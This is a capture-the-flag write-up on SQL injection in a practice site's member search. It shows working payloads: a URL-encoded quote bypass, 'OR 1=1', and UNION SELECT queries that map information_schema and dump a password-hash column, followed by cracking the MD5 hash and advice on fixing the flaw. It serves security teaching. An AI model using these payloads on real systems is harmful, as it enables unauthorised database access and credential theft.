# SQL injection users

### Breach Description:

The Search member input is susceptible to SQL injection such that:

```jsx
ID: 1%27 OR 1=1 UNION SELECT countersign, commentaire FROM users 
First name: 5ff9d0165b4f92b14994e5c685cdce28
Surname : Decrypt this password -> then lower all the char. Sh256 on it and it's good !
```

 

leads us to the Flag:

10A16D834F9B1E4068B25C4C46FE0284E99E44DCEAF08098FC83925BA6310FF5

### Breach Explanation:

When searching for members, one quickly can quickly realise the return of the search is the unfiltered return of an sql query. For example, typing the “’” char gives this error:

```jsx
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\'' at line 1
```

From this we get quite some information:

- The server uses MariaDB
- basic sanitation is done to escape sql characters

We can assume the sql query being executed looks something like:

```jsx
SELECT * FROM users WHERE user_id = '(our input goes here)'
```

What we could try do to is have our input be

```jsx
' OUR SQL CODE -- and now all of this is a comment
```

which would make the complete request:

```jsx
SELECT * FROM users WHERE user_id = '' OUR SQL CODE -- and now all of this is a comment'
```

However, because the input is sanitized and the ‘ is escaped we end up with: 

```jsx
SELECT * FROM users WHERE user_id = '\' OUR SQL CODE -- and now this is still part of the string'
```

After trying a few methods to bypass sanitation like: 

- Escaping the escape char
- Doubling up ‘ char
- Checking if perhaps sanitation happens on the front end
- etc

We find that url encoding our “’” char gets is past sanitation, this gives us:

```jsx
1%27
```

This now opens the door for us to inject our own modifiers to this sql request

SQL injection to get all users:

```jsx
1%27 OR 1=1
```

This gets us a list of all the users, not bad, but not that useful. luckily, we can use a UNION to select more things, and gather information about the structure of the db, and other columns we might want to look at. We can tell this is a MariaDB database, and we can request some information from the databases containing metadata on other databases, the structure of those can be found online.

```jsx
1%27 UNION SELECT column_name, table_name FROM information_schema.columns
```

this gets us a very, very long list, that contains all the column names and all their associated tables, from this we can see that there is a commentaire column, and a countersign column in the users table.

now we can craft another injection to get this information for all out users, and doing so gives us this interesting entry:

  

```jsx
ID: 1%27 OR 1=1 UNION SELECT countersign, commentaire FROM users 
First name: 5ff9d0165b4f92b14994e5c685cdce28
Surname : Decrypt this password -> then lower all the char. Sh256 on it and it's good !
```

MD5 encryption is vulnerable, a simple online decryptor gives us:

```jsx
FortyTwo
```

Which transformed as indicated in the comment gives us the flag:

```jsx
10A16D834F9B1E4068B25C4C46FE0284E99E44DCEAF08098FC83925BA6310FF5
```

## Breach Fix:

Firstly getting the direct return of the SQL query in the page makes this way too easy, allowing multiple returns instead of one, giving errors that may help with discovery etc. transforming the return to make sure it only returns one field, and does not forward errors would complicate this exploit tremendously.

Secondly to stop this exploit completely, one needs to improve sanitation so that a basic bypass will not work anymore. One can obviously go about this manually, but many libraries and ORM will do this reliably. In this case the id is a simple int, so even throwing an error when any non digit char is met would have stopped this exploit.
